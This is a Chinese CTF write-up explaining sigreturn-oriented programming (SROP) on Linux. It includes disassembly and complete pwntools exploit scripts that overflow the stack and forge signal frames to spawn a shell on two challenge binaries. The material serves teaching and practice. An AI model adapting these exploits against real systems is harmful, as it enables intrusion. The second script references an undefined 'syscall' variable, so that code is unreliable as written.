---
title: srop
date: 2024-05-13 20:45:07
category: pwn
tags: [srop,栈溢出,系统调用]
---
> 参考资料：https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_1

# signal 机制

signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：

![](/img/pwn/ProcessOfSignalHandlering.png)

1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。
2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址**。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的**。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。

![](/img/pwn/signal2-stack.png)

对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext

* x86
```c
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};

```

* x64
```c
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};

```

3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。

# 攻击原理
仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：

* Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。
* 由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。

说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。

## 获取 shell
首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息

![](/img/pwn/srop-example-1.png)

当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。

## system call chains
需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可

* 控制栈指针。
* 把原来 rip 指向的syscall gadget 换成syscall; ret gadget。

如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。

![](/img/pwn/srop-example-2.png)

## 后续
需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件

* 可以通过栈溢出来控制栈的内容
* 需要知道相应的地址
    * "/bin/sh"
    * Signal Frame
    * syscall
    * sigreturn
* 需要有够大的空间来塞下整个 sigal frame

此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：

![](/img/pwn/srop-gadget-1.png)

并且，作者发现，有些系统上 SROP 的地址被随机化了，而有些则没有。比如说`Linux < 3.3 x86_64`（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&return 代码片段。如下

![](/img/pwn/srop-gadget-2.png)

但是目前它已经被`vsyscall-emulate`和`vdso`机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。

值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。

# 利用工具
值得一提的是，在目前的 pwntools 中已经集成了对于 srop 的攻击。

# 示例

## 2016-360春秋杯-srop
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop

### 检查保护
```sh
➜  2016-360春秋杯-srop checksec smallest 
[*] '/home/zzkkk1h/Desktop/ctf-challenges-master/pwn/stackoverflow/srop/2016-360春秋杯-srop/smallest'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### ida分析
```x86asm
.text:00000000004000B0                 public start
.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h       ; count
.text:00000000004000B8                 mov     rsi, rsp        ; buf
.text:00000000004000BB                 mov     rdi, rax        ; fd
.text:00000000004000BE                 syscall                 ; LINUX - sys_read
.text:00000000004000C0                 retn
.text:00000000004000C0 start           endp
.text:00000000004000C0
.text:00000000004000C0 _text           ends
.text:00000000004000C0
.text:00000000004000C0
.text:00000000004000C0                 end start
```
执行了一个read系统调用，对应的函数为read(0,*rsp,0x400)，明显有栈溢出

### 利用思路
首先通过read的返回值控制rax，从而执行sigreturn的系统调用（64位sigreturn的系统调用号为15）
利用sigreturn布置寄存器，从而执行execve系统调用获取shell

### exp
```python
from pwn import *

p = process("./smallest")

context.arch = 'amd64'
#context.log_level = 'debug'
#gdb.attach(p)

syscall_ret = 0x4000BE
start_addr = 0x4000B0

payload1 = p64(start_addr)*3
p.send(payload1)
sleep(0.1)
p.send(b'\xb3')
leak = u64(p.recv()[8:16])
#print(hex(leak))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = leak
sigframe.rdx = 0x400
sigframe.rsp = leak
sigframe.rip = syscall_ret
payload2 = p64(start_addr) + p64(0) + bytes(sigframe)
#print(bytes(sigframe))
p.send(payload2)
sleep(0.1)

payload3 = p64(syscall_ret) + b'A'*7
p.send(payload3)
sleep(0.1)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = leak+0x120
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = leak
sigframe.rip = syscall_ret

payload4 = (p64(start_addr) + p64(0) + bytes(sigframe)).ljust(0x120,b'\x00')+b'/bin/sh\x00'
p.send(payload4)
sleep(0.1)

p.send(payload3)

p.interactive()
```

## 2015-defcon-fakeup
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2015-defcon-fakeup

挖坑~

## ciscn_2019_s_3
> 题目地址：https://buuoj.cn/challenges#ciscn_2019_s_3

### 检查保护
```sh
➜  31.ciscn_2019_s_3 checksec ciscn_s_3 
[*] '/home/zzkkk1h/Desktop/Pwn/BUUCTF/31.ciscn_2019_s_3/ciscn_s_3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### ida分析
main函数直接调用了vuln函数，vuln函数有两个系统调用

```x86asm
.text:00000000004004ED                 public vuln
.text:00000000004004ED vuln            proc near               ; CODE XREF: main+14↓p
.text:00000000004004ED
.text:00000000004004ED buf             = byte ptr -10h
.text:00000000004004ED
.text:00000000004004ED ; __unwind {
.text:00000000004004ED                 push    rbp
.text:00000000004004EE                 mov     rbp, rsp
.text:00000000004004F1                 xor     rax, rax
.text:00000000004004F4                 mov     edx, 400h       ; count
.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf
.text:00000000004004FE                 mov     rdi, rax        ; fd
.text:0000000000400501                 syscall                 ; LINUX - sys_read
.text:0000000000400503                 mov     rax, 1
.text:000000000040050A                 mov     edx, 30h ; '0'  ; count
.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf
.text:0000000000400514                 mov     rdi, rax        ; fd
.text:0000000000400517                 syscall                 ; LINUX - sys_write
.text:0000000000400519                 retn
.text:0000000000400519 vuln            endp ; sp-analysis failed
.text:0000000000400519
.text:0000000000400519 ; ---------------------------------------------------------------------------
.text:000000000040051A                 db 90h
.text:000000000040051B ; ---------------------------------------------------------------------------
.text:000000000040051B                 pop     rbp
.text:000000000040051C                 retn
.text:000000000040051C ; } // starts at 4004ED
```

还有个gadget函数，给了sigreturn和execve的系统调用

```x86asm
.text:00000000004004D6                 public gadgets
.text:00000000004004D6 gadgets         proc near
.text:00000000004004D6 ; __unwind {
.text:00000000004004D6                 push    rbp
.text:00000000004004D7                 mov     rbp, rsp
.text:00000000004004DA                 mov     rax, 0Fh ;sigreturn的系统调用号
.text:00000000004004E1                 retn
.text:00000000004004E1 gadgets         endp ; sp-analysis failed
.text:00000000004004E1
.text:00000000004004E2 ; ---------------------------------------------------------------------------
.text:00000000004004E2                 mov     rax, 59 ;execve的系统调用号
.text:00000000004004E9                 retn
.text:00000000004004E9 ; ---------------------------------------------------------------------------
.text:00000000004004EA                 db 90h
.text:00000000004004EB ; ---------------------------------------------------------------------------
.text:00000000004004EB                 pop     rbp
.text:00000000004004EC                 retn
.text:00000000004004EC ; } // starts at 4004D6
```

vuln的栈帧大小为0，但在rsp-10h的位置读入了通过read系统调用读入了400h的数据，很明显有栈溢出漏洞
最后没有发现pop，所以溢出点为16，后面紧跟着返回地址
同时ret回vuln后，vuln会执行push ebp指令，从而恢复栈帧，所以可以反复溢出

### 利用思路
首先检查这个程序的字符串，发现是没有"/bin/sh"的，所以要想办法泄露栈上的地址，通过偏移得到buf的地址，在buf这儿写上"/bin/sh\x00"
之后便可以通过sigreturn系统调用操控寄存器，来执行execve系统调用获取shell（其实这里可以使用csu，但不如sigreturn方便）

### exp
```python
from pwn import *

#p = process('./ciscn_s_3')
p = remote("node5.buuoj.cn",28047)

context.arch = 'amd64'
#context.log_level = 'debug'
#gdb.attach(p)

mov_rax_15 = 0x4004DA
mov_addr = 0x400580
pop_addr = 0x40059A
syscall_ret = 0x400517
vuln = 0x4004ed
ret = 0x400538
pop_rdi = 0x4005a3

payload1 = b'A'*16
payload1+= p64(vuln)
p.send(payload1)

p.recv(32)
leak=u64(p.recv(8))
print(hex(leak))
buf = leak - 0x118  # 通过泄露出的栈上的地址(某个ebp)调试出与buf的偏移，计算buf的地址
                    # 我们后面在buf这写上b'/bin/sh\x00'

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = buf
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall

payload2 = b'/bin/sh\x00'.ljust(16,b'A') + p64(mov_rax_15) + p64(syscall) + bytes(sigframe)
p.sendline(payload2)

p.interactive()
```

